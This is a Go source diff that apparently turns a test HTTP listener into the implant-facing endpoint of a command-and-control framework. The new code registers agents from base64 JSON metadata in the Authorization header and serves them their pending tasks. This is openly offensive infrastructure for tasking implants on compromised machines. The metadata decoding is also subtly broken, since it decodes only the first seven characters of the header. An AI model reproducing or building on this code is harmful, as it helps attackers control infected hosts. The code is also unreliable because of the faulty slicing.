@@ -2,12 +2,15 @@ package listeners
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"log"
 	"net/http"
 	"sync"
 	"time"
+
+	"github.com/gerbsec/D2/agents" // Replace with your project path
 )
 
 type HttpListener struct {
@@ -20,13 +23,54 @@ type HttpListener struct {
 
 var listenersMap = make(map[string]*HttpListener)
 
-func (s *HttpListener) handler(w http.ResponseWriter, r *http.Request) {
-	fmt.Fprintf(w, "Hello from listener %s!\n", s.Name)
+var agentService agents.AgentService = agents.NewService()
+
+func handleImplant(w http.ResponseWriter, r *http.Request) {
+	metadata, err := extractMetadata(r.Header)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusNotFound)
+		return
+	}
+
+	agent := agentService.GetAgent(metadata.Id)
+	if agent == nil {
+		agent = agents.NewAgent(metadata)
+		agentService.AddAgent(agent)
+	}
+
+	tasks := agent.GetPendingTasks()
+	response, _ := json.Marshal(tasks)
+	w.Write(response)
+}
+
+func extractMetadata(headers http.Header) (*agents.AgentMetadata, error) {
+	encodedMetadataArr, ok := headers["Authorization"]
+	if !ok || len(encodedMetadataArr) == 0 {
+		return nil, fmt.Errorf("no authorization header found")
+	}
+
+	encodedMetadata := encodedMetadataArr[0]
+	if len(encodedMetadata) < 7 {
+		return nil, fmt.Errorf("malformed authorization header")
+	}
+
+	decodedBytes, err := base64.StdEncoding.DecodeString(encodedMetadata[:7])
+	if err != nil {
+		return nil, fmt.Errorf("failed to decode base64: %v", err)
+	}
+
+	var metadata agents.AgentMetadata
+	err = json.Unmarshal(decodedBytes, &metadata)
+	if err != nil {
+		return nil, fmt.Errorf("failed to unmarshal JSON: %v", err)
+	}
+
+	return &metadata, nil
 }
 
 func (s *HttpListener) Start() {
 	mux := http.NewServeMux()
-	mux.HandleFunc("/", s.handler)
+	mux.HandleFunc("/handleImplant", handleImplant)
 
 	s.server = &http.Server{
 		Addr:    ":" + s.BindPort,
